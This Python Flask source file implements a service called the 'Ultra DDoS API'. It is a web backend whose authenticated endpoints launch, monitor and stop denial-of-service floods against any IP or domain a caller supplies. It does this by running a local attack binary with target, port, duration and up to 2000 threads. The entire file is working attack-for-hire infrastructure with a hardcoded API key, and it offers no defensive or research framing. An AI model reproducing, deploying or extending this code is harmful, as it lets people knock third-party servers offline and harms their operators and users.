# ultra_api.py (with root endpoint)
import os
import sys
import time
import json
import uuid
import hmac
import hashlib
import subprocess
import threading
import re
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

# ==================== CONFIG ====================
API_KEY = "ultra-secure-key-2024"
BINARY_PATH = "./ultra"
RATE_LIMIT = 30
MAX_DURATION = 300
MAX_THREADS = 2000
MAX_PORT = 65535
MIN_PORT = 1

# ==================== INIT ====================
app = Flask(__name__)
CORS(app)

# Memory storage
active_attacks = {}
rate_limiter = {}
attack_history = []
stats_lock = threading.Lock()

# Binary check
if os.path.exists(BINARY_PATH):
    os.chmod(BINARY_PATH, 0o755)
    print(f"✅ Binary found")
else:
    print(f"❌ Binary not found at {BINARY_PATH}")
    sys.exit(1)

# ==================== ROOT ENDPOINT ====================
@app.route('/')
def home():
    return jsonify({
        'name': 'Ultra DDoS API',
        'version': '1.0',
        'status': 'active',
        'server_time': datetime.now().isoformat(),
        'endpoints': {
            'root': '/ (GET) - This message',
            'health': '/health (GET) - Health check',
            'docs': '/docs (GET) - API documentation',
            'attack': '/api/attack (POST) - Launch attack',
            'stop': '/api/stop/<id> (POST) - Stop attack',
            'status': '/api/status/<id> (GET) - Check status',
            'stats': '/api/stats (GET) - Server statistics'
        },
        'auth': 'Bearer YOUR_API_KEY in Authorization header',
        'example': {
            'attack': {
                'method': 'POST',
                'url': '/api/attack',
                'headers': {'Authorization': 'Bearer ultra-secure-key-2024'},
                'body': {
                    'target': 'example.com',
                    'port': 80,
                    'duration': 60,
                    'threads': 500
                }
            }
        }
    })

# ==================== HEALTH ====================
@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'healthy',
        'time': time.time(),
        'active_attacks': len(active_attacks)
    })

# ==================== DOCS ====================
@app.route('/docs', methods=['GET'])
def docs():
    return jsonify({
        'name': 'Ultra DDoS API',
        'version': '1.0',
        'base_url': request.host_url.rstrip('/'),
        'endpoints': {
            'attack': {
                'method': 'POST',
                'path': '/api/attack',
                'params': {
                    'target': 'IP or domain (required)',
                    'port': 'Port (default: 80)',
                    'duration': 'Seconds (default: 60)',
                    'threads': 'Thread count (default: 500)'
                }
            },
            'stop': {
                'method': 'POST',
                'path': '/api/stop/{attack_id}'
            },
            'status': {
                'method': 'GET',
                'path': '/api/status/{attack_id}'
            },
            'stats': {
                'method': 'GET',
                'path': '/api/stats'
            },
            'health': {
                'method': 'GET',
                'path': '/health'
            },
            'docs': {
                'method': 'GET',
                'path': '/docs'
            }
        },
        'auth': 'Bearer YOUR_API_KEY in Authorization header',
        'rate_limit': f'{RATE_LIMIT} seconds between attacks',
        'limits': {
            'max_duration': f'{MAX_DURATION}s',
            'max_threads': MAX_THREADS,
            'max_port': MAX_PORT
        }
    })

# ==================== SECURITY FUNCTIONS ====================
def verify_key(auth_header):
    if not auth_header or not auth_header.startswith('Bearer '):
        return False
    token = auth_header.split(' ')[1]
    return hmac.compare_digest(token, API_KEY)

def check_rate_limit(ip):
    with stats_lock:
        if ip in rate_limiter:
            last = rate_limiter[ip]
            if time.time() - last < RATE_LIMIT:
                remaining = int(RATE_LIMIT - (time.time() - last))
                return False, remaining
    return True, 0

def validate_target(target):
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ip_pattern, target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    
    domain_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$'
    if re.match(domain_pattern, target):
        return True
    
    return False

# ==================== ATTACK EXECUTOR ====================
class AttackExecutor:
    def __init__(self):
        self.semaphore = threading.Semaphore(10)
    
    def execute(self, target, port, duration, threads, client_ip):
        with self.semaphore:
            attack_id = str(uuid.uuid4())[:8]
            
            try:
                cmd = [BINARY_PATH, target, str(port), str(duration), str(threads)]
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    start_new_session=True
                )
                
                with stats_lock:
                    active_attacks[attack_id] = {
                        'id': attack_id,
                        'target': target,
                        'port': port,
                        'duration': duration,
                        'threads': threads,
                        'start_time': time.time(),
                        'process': process,
                        'client_ip': client_ip,
                        'status': 'running',
                        'output': []
                    }
                    
                    rate_limiter[client_ip] = time.time()
                
                def read_output():
                    while True:
                        output = process.stdout.readline()
                        if output:
                            with stats_lock:
                                if attack_id in active_attacks:
                                    active_attacks[attack_id]['output'].append(output.strip())
                                    if len(active_attacks[attack_id]['output']) > 50:
                                        active_attacks[attack_id]['output'].pop(0)
                        if process.poll() is not None:
                            break
                
                threading.Thread(target=read_output, daemon=True).start()
                
                def auto_stop():
                    time.sleep(duration)
                    self.stop(attack_id)
                
                threading.Thread(target=auto_stop, daemon=True).start()
                
                return {
                    'success': True,
                    'attack_id': attack_id,
                    'message': f'Attack launched on {target}:{port}'
                }
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def stop(self, attack_id):
        with stats_lock:
            if attack_id in active_attacks:
                attack = active_attacks[attack_id]
                try:
                    attack['process'].terminate()
                    time.sleep(1)
                    if attack['process'].poll() is None:
                        attack['process'].kill()
                    
                    attack['status'] = 'stopped'
                    attack_history.append(attack.copy())
                    del active_attacks[attack_id]
                except:
                    pass
                return True
        return False
    
    def status(self, attack_id):
        with stats_lock:
            if attack_id in active_attacks:
                attack = active_attacks[attack_id]
                elapsed = time.time() - attack['start_time']
                return {
                    'status': 'running',
                    'elapsed': int(elapsed),
                    'remaining': int(attack['duration'] - elapsed),
                    'target': f"{attack['target']}:{attack['port']}"
                }
            
            for attack in reversed(attack_history):
                if attack['id'] == attack_id:
                    return {
                        'status': attack['status'],
                        'target': f"{attack['target']}:{attack['port']}",
                        'duration': attack['duration']
                    }
        return None

executor = AttackExecutor()

# ==================== API ENDPOINTS ====================
@app.route('/api/attack', methods=['POST'])
def attack():
    if not verify_key(request.headers.get('Authorization')):
        return jsonify({'error': 'Invalid API key'}), 401
    
    client_ip = request.remote_addr
    allowed, remaining = check_rate_limit(client_ip)
    if not allowed:
        return jsonify({'error': f'Rate limited. Wait {remaining}s'}), 429
    
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    target = data.get('target') or data.get('ip')
    port = data.get('port', 80)
    duration = data.get('duration', 60)
    threads = data.get('threads', 500)
    
    if not target:
        return jsonify({'error': 'Target required'}), 400
    
    if not validate_target(target):
        return jsonify({'error': 'Invalid target format'}), 400
    
    try:
        port = int(port)
        if port < MIN_PORT or port > MAX_PORT:
            return jsonify({'error': f'Port must be {MIN_PORT}-{MAX_PORT}'}), 400
    except:
        return jsonify({'error': 'Invalid port'}), 400
    
    try:
        duration = int(duration)
        if duration < 1 or duration > MAX_DURATION:
            return jsonify({'error': f'Duration must be 1-{MAX_DURATION}s'}), 400
    except:
        return jsonify({'error': 'Invalid duration'}), 400
    
    try:
        threads = int(threads)
        if threads < 1 or threads > MAX_THREADS:
            return jsonify({'error': f'Threads must be 1-{MAX_THREADS}'}), 400
    except:
        return jsonify({'error': 'Invalid thread count'}), 400
    
    result = executor.execute(target, port, duration, threads, client_ip)
    
    if result['success']:
        return jsonify(result)
    else:
        return jsonify(result), 500

@app.route('/api/stop/<attack_id>', methods=['POST'])
def stop(attack_id):
    if not verify_key(request.headers.get('Authorization')):
        return jsonify({'error': 'Invalid API key'}), 401
    
    if executor.stop(attack_id):
        return jsonify({'success': True, 'message': f'Attack {attack_id} stopped'})
    else:
        return jsonify({'error': 'Attack not found'}), 404

@app.route('/api/status/<attack_id>', methods=['GET'])
def status(attack_id):
    if not verify_key(request.headers.get('Authorization')):
        return jsonify({'error': 'Invalid API key'}), 401
    
    status_info = executor.status(attack_id)
    if status_info:
        return jsonify(status_info)
    else:
        return jsonify({'error': 'Attack not found'}), 404

@app.route('/api/stats', methods=['GET'])
def stats():
    if not verify_key(request.headers.get('Authorization')):
        return jsonify({'error': 'Invalid API key'}), 401
    
    with stats_lock:
        return jsonify({
            'active_attacks': len(active_attacks),
            'total_attacks': len(attack_history),
            'rate_limit': RATE_LIMIT,
            'max_duration': MAX_DURATION,
            'max_threads': MAX_THREADS,
            'active_list': [
                {
                    'id': aid,
                    'target': f"{a['target']}:{a['port']}",
                    'elapsed': int(time.time() - a['start_time']),
                    'remaining': int(a['duration'] - (time.time() - a['start_time']))
                }
                for aid, a in list(active_attacks.items())[:10]
            ]
        })

# ==================== MAIN ====================
if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print("🔥" * 40)
    print("🔥        ULTRA API - READY TO USE        🔥")
    print("🔥" * 40)
    print(f"\n✅ Binary: {BINARY_PATH}")
    print(f"🔑 API Key: {API_KEY}")
    print(f"⚡ Rate Limit: {RATE_LIMIT}s")
    print(f"📊 Max Duration: {MAX_DURATION}s")
    print(f"🎯 Max Threads: {MAX_THREADS}")
    print("\n📡 AVAILABLE ENDPOINTS:")
    print("   🌐  GET  /            - API info")
    print("   🌐  GET  /health      - Health check")
    print("   🌐  GET  /docs        - Documentation")
    print("   ⚡  POST /api/attack   - Launch attack")
    print("   ⚡  POST /api/stop/id  - Stop attack")
    print("   📊  GET  /api/status/id - Check status")
    print("   📈  GET  /api/stats    - Statistics")
    print("\n🌍 Server: http://0.0.0.0:5000")
    print("=" * 50)
    print("🚀 Server running... Press Ctrl+C to stop")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)